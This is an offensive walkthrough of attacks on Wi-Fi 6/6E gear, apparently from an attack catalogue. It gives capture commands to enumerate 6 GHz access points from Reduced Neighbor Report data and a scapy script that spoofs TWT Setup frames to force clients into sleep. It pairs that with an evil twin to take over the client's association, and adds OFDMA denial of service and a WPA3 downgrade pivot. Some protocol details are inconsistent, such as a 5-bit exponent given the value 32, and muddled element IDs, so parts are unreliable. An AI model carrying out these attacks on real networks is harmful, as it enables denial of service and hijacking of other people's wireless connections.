# Wi-Fi 6 / 6E — walkthrough

Three practical primitives against 6/6E gear. All three assume a
Pineapple Mk VII plus a `wlan1` capable of 5 GHz monitor+injection. 6 GHz
tuning is optional; the RNR path deliberately does not need it.

## 6 GHz-capable radios and driver requirements

Naming the small set of Linux-usable 6 GHz radios explicitly — the field
is thin and each one has caveats:

- **Intel AX210 / AX211** (`iwlwifi`). Tri-band 2.4 / 5 / 6 GHz. Needs
  the `wireless-regdb` US regdomain plus a recent `iwlwifi` (kernel
  5.10+; backports repo for older distros). 6 GHz operation is gated
  on a matching regdomain — set with `iw reg set US`. Monitor mode
  works via `iw dev wlanX set monitor none`; **injection on 6 GHz is
  partial / frequently broken** — many firmware releases silently drop
  injected frames on UNII-5+ even though monitor is up.
- **Intel BE200 / BE201** (`iwlwifi`). Wi-Fi 7 (802.11be). Requires
  **kernel ≥ 6.6** for stable operation; MLO support is not fully
  upstream on Linux until 6.8+. Same regdomain gating as AX210.
- **MediaTek MT7921K** (`mt76`, `mt7921` driver family). Tri-band,
  patched aircrack-ng gets injection working on 6 GHz. Cleaner
  mainline story than Intel for injection but a smaller ecosystem.
- **MediaTek MT7922** — newer part, cleaner mainline mt76 support;
  same 6 GHz story as MT7921K.
- **Realtek RTW89** (`rtw89` module: RTL8852AE / RTL8852BE / RTL8851BE
  are the current 6 GHz-capable parts). 6 GHz works but with
  regdomain and monitor-mode caveats — some revisions refuse to enter
  monitor with a 6 GHz-only channel selected until the interface is
  first parked on 2.4 or 5 GHz.

Monitor + injection support summary:

| Chipset      | Monitor 6 GHz | Injection 6 GHz         |
| ------------ | ------------- | ----------------------- |
| Intel AX210  | Yes           | Partial (often broken)  |
| Intel BE200  | Yes           | Partial                 |
| MT7921K      | Yes           | Yes (patched aircrack)  |
| MT7922       | Yes           | Yes (patched aircrack)  |
| RTW89 series | Yes (with regdomain workaround) | Limited |

## Path A — RNR-driven 6 GHz recon (no 6 GHz radio)

A 6E-capable AP MUST advertise its 6 GHz BSSIDs in the Reduced Neighbor
Report IE of its 2.4/5 GHz beacons. That means you can enumerate 6 GHz
targets from a stock 2.4/5 GHz card.

```
# 1a. Passive capture on 2.4 + 5 GHz (no 6 GHz radio needed).
airodump-ng --band abg -w /tmp/rnr wlan1mon
# NOTE: --band abg = 2.4 + 5 GHz only. `a` = 5 GHz, `b`/`g` = 2.4 GHz.
# For 6 GHz you need a 6 GHz-capable radio AND `--band ae` (a = 5 GHz,
# e = 6 GHz); some aircrack-ng builds accept `--band 6` explicitly.

# 1b. Full 2.4 + 5 + 6 GHz capture (needs a 6 GHz radio from the table above):
airodump-ng --band abge -w /tmp/all wlan1mon

# 2. Extract RNR IEs (IE 201) from beacons.
tshark -r /tmp/rnr-01.cap -Y "wlan.tag.number == 201" \
       -T fields -e wlan.bssid -e wlan.rnr.tbtt_info.bssid \
                 -e wlan.rnr.tbtt_info.channel
```

Each RNR entry names a neighbor BSSID + operating class + channel. If
the channel is in the 6 GHz range (operating class 131–137), you have a
6 GHz target enumerated from 2.4/5 GHz probing alone.

## Path B — TWT forced-sleep abuse

TWT (Target Wake Time) is negotiated with Action frames. A spoofed TWT
Setup Request from the AP's BSSID can shove a client into extended
sleep — the client won't hear anything until the wake window it
believes it agreed to.

### TWT Wake Interval — the math

Per 802.11ax-2021 §9.4.2.199, an individual TWT Wake Interval is
encoded as:

- **Mantissa** — 2 bytes (16 bits), little-endian.
- **Exponent** — 5 bits (in the Request Type / Control byte,
  depending on the TWT variant).

`Wake Interval = Mantissa × 2^Exponent` microseconds.

Some worked values:

- Mantissa = 1, Exponent = 32 → `1 × 2^32 μs = 4 294 967 296 μs ≈
  **4 295 s** ≈ 71.6 minutes`.  (NOT 4.29 s — the earlier version of
  this doc dropped three orders of magnitude.)
- Mantissa = 65 535, Exponent = 31 → practical maximum, on the order
  of `(2^16 − 1) × 2^31 μs ≈ 1.4 × 10^14 μs ≈ 4.5 years`.

For the forced-sleep primitive, pick the largest interval the client
will accept (many supplicants cap requested intervals at a few seconds
to minutes; a mantissa/exponent pair that yields ~30 s is more likely
to be honored than one that yields hours).

### TWT Setup Action frame — element body

- **Category:** 30 (0x1E) — HE Action (per 802.11ax-2021 Table 9-51).
  NOT 6 — Category 6 is Fast BSS Transition (802.11r).
- **HE Action:** 1 (Broadcast TWT), 6 (TWT Setup), or 7 (TWT Teardown).
- **Element ID:** 255 (Element ID Extension).
- **Element ID Extension:** 216 (0xD8) for Broadcast TWT, or 78 (0x4E)
  for individual TWT (via S1G/HE variants).

Broadcast TWT element layout (802.11ax-2021 §9.4.2.199, Ext ID 43 in
older drafts / 216 in 2021):

```
| Element ID (255) | Length | Ext ID (216) | Control (1B) | TWT Params (var) |
```

Control byte bits (§9.4.2.199 Figure 9-687):

- Bit 0: NDP Paging Indicator
- Bit 1: Responder PM Mode
- Bits 2..4: Negotiation Type (0 = Individual, 3 = Broadcast)
- Bit 5: TWT Information Frame Disabled
- Bit 6: Wake Duration Unit (0 = 256 μs, 1 = TU / 1024 μs)
- Bit 7: reserved

TWT Parameter Information (Individual TWT):

```
| Request Type (2B) | Target Wake Time (8B) | Nominal Min Wake Dur (1B) |
| Wake Interval Mantissa (2B) | Channel (1B, optional) |
```

Request Type bits carry the Wake Interval Exponent (5 bits) and the
Setup Command (3 bits — 0 = Request, 1 = Suggest, 2 = Demand, 4 = Accept,
5 = Alternate, 6 = Dictate, 7 = Reject).

```python
# scapy sketch (needs a monitor+inject iface)
from scapy.all import *
import struct

CLIENT_MAC = "aa:bb:cc:dd:ee:ff"
AP_BSSID   = "11:22:33:44:55:66"

# Build a Request Type field:
#   NDP Paging = 0, Responder PM = 0, Negotiation Type = 0 (Individual),
#   TWT Info Disabled = 1, Wake Duration Unit = 0,
#   Setup Command = 2 (Demand), Trigger = 0, Implicit = 1,
#   Flow Type = 0 (announced), Flow ID = 0,
#   Wake Interval Exponent = 20 (2^20 μs ≈ 1.05 s per mantissa unit),
#   Protection = 0.
req_type = 0x0000  # fill in per §9.4.2.199 for a real run

# Wake Interval Mantissa = 30 → 30 × 2^20 μs ≈ 31.5 s wake interval.
mantissa = 30

twt_param = (
    struct.pack("<H", req_type) +
    struct.pack("<Q", 0)               # Target Wake Time = 0 (immediate)
    + b"\x40"                          # Nominal Min Wake Dur (× 256 μs)
    + struct.pack("<H", mantissa)
)

twt_element = bytes([
    0xFF,                              # Element ID = 255 (Extension)
    1 + len(twt_param),                # Length
    0xD8,                              # Ext ID = 216 (Broadcast TWT / TWT)
    0x0C,                              # Control byte
]) + twt_param

action_body = bytes([
    30,          # Category = 30 (HE Action) — NOT 6.
    6,           # HE Action = 6 (TWT Setup)
]) + twt_element

twt = Dot11(
    type=0, subtype=13,           # mgmt, action
    addr1=CLIENT_MAC,
    addr2=AP_BSSID,               # spoofed
    addr3=AP_BSSID,
) / Raw(load=action_body)
sendp(RadioTap()/twt, iface="wlan1mon")
```

While the client sleeps, you can stand up a rogue on the same SSID+PSK
and take over the association on wake. This is a client-side DoS
primitive; combine with evil-twin for takeover.

## Path C — RU-based OFDMA DoS

Trigger frames instruct STAs when to transmit on which Resource Units.
An attacker who acknowledges an RU allocation but never transmits eats
capacity for other STAs. Not a client-takeover primitive but useful to
degrade a target AP so a rogue-side reassociation looks attractive.

## Path D — 6 GHz auth reduces to Dragonblood-family

Any auth attack on 6 GHz is a WPA3-SAE attack (no WPA2 allowed on
6 GHz). If the client tolerates a WPA2 side on 2.4/5 GHz for the same
network (which many corporate deployments do), the whole 6 GHz
"WPA3-only" property doesn't help you — pivot to the 2.4/5 GHz side
and treat it as WPA2/3 transition. See `wpa3-transition-downgrade`.

## Failure modes

- **RNR IE absent.** Cheaper 6E APs sometimes omit RNR from their
  5 GHz beacons even though the spec says MUST. Fall back to a 6 GHz
  card if you have one (ath11k / mt76 / rtw89 with a 6E-capable module).
- **TWT frame ignored.** Client isn't HE-capable, or its supplicant
  requires TWT to be pre-negotiated with a valid handshake. Confirm
  the client actually negotiated TWT with a prior `wireshark`
  filter `wlan.fixed.category_code == 30` (HE Action; Category 6 is
  Fast BSS Transition, not HE).
- **6 GHz-only client.** Some laptops with 6E cards will refuse to
  associate to a 2.4/5 GHz WPA2 side even when it advertises the same
  SSID + PSK. The downgrade path stops there.

## Cite

- IEEE Std 802.11ax-2021, §26 (HE), §27 (TWT).
- Wi-Fi Alliance — Wi-Fi CERTIFIED 6E requirements.
- attacks.json: `rnr-6ghz-enumeration`, `twt-forced-sleep-abuse`,
  `ru-based-ofdma-dos`, `wpa3-transition-downgrade`.
